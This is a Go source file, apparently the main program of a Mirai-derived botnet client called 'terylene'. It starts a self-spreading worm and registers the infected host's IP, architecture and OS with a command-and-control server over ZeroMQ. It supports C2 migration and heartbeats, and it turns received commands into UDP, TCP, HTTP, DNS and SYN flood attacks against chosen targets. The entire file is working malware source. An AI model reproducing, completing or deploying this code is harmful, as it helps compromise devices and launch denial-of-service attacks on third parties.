package main

import (
	"fmt"
	"strconv"
	"strings"
	config "terylene/config"
	system "terylene/mirai/components/system"
	worm "terylene/mirai/components/worm"
	attack "terylene/mirai/ddos"

	zmq "github.com/pebbe/zmq4"
)

func migration(dealer, subscriber *zmq.Socket, C2ip, rport string) {
	dealer.Close()
	subscriber.Close()
	nsubscriber, _ := zmq.NewSocket(zmq.SUB)
	nsubscriber.SetLinger(0)
	ndealer, _ := zmq.NewSocket(zmq.DEALER)
	ndealer.SetLinger(0)
	register(ndealer, nsubscriber, C2ip, rport)
}

func dealerhandle(dealer, subscriber *zmq.Socket) {
	for {
		res, err := dealer.RecvMessage(0)
		if err != nil {
			continue
		}

		if res[0] == "heartbeat" {
			dealer.SendMessage("heartbeat")
		}

		if len(res) == 3 {
			if res[0] == "migrate" {
				migration(dealer, subscriber, res[1], res[2])
			}
		}
	}
}

func register(dealer, subscriber *zmq.Socket, C2ip, rport string) error {
	err := dealer.Connect(fmt.Sprintf("tcp://%s:%s", C2ip, rport))

	if err != nil {
		return err
	}
	ip, err := system.GETIPDNS()
	if err != nil {
		return err
	}
	arch, OS := system.GETSYSTEM()

	_, err = dealer.SendMessage("reg", arch, OS, ip)
	if err != nil {
		return err
	}

	res, err := dealer.RecvMessage(0)
	if err != nil {
		return err
	}
	if res[0] == "terylene" {
		go dealerhandle(dealer, subscriber)
		terylene(subscriber, C2ip, res[0], res[1])
	}
	return nil
}

func terylene(subscriber *zmq.Socket, C2ip, bot, bport string) {
	defer subscriber.Close()
	subscriber.Connect(fmt.Sprintf("tcp://%s:%s", C2ip, bport))
	subscriber.SetSubscribe(bot)
	for {
		message, _ := subscriber.Recv(0)

		parts := strings.Split(message, ":")
		message = parts[1]
		if strings.Contains(message, "!") {
			for _, value := range config.Methods {
				if strings.Contains(message, value) {
					parts := strings.Fields(message)
					if len(parts) == 4 {
						method := strings.TrimPrefix(parts[0], "!")
						target := parts[1]
						port, err := strconv.Atoi(parts[2])
						if err != nil {
							continue
						}
						duration, err := strconv.Atoi(parts[3])
						if err != nil {
							continue
						}
						switch method {
						case "UDP":
							for i := 1; i < 5; i++ {
								go attack.UDP(target, port, duration)
							}
						case "TCP":
							for i := 1; i < 5; i++ {
								go attack.TCP(target, port, duration)
							}
						case "HTTP":
							for i := 1; i < 5; i++ {
								go attack.HTTP(target, duration)
							}
						case "DNS":
							for i := 1; i < 5; i++ {
								go attack.DNS(target, duration)
							}
						case "SYN":
							for i := 1; i < 5; i++ {
								go attack.SYN(target, port, duration)
							}
						case "UDP-VIP":
							for i := 1; i < 5; i++ {
								go attack.UDP_VIP(target, port, duration)
							}
						}
					}
				}
			}
		}
	}
}
func main() {
	go worm.Startworm()
	subscriber, _ := zmq.NewSocket(zmq.SUB)
	subscriber.SetLinger(0)
	dealer, _ := zmq.NewSocket(zmq.DEALER)
	dealer.SetLinger(0)
	register(dealer, subscriber, config.C2ip, config.Routerport)
}
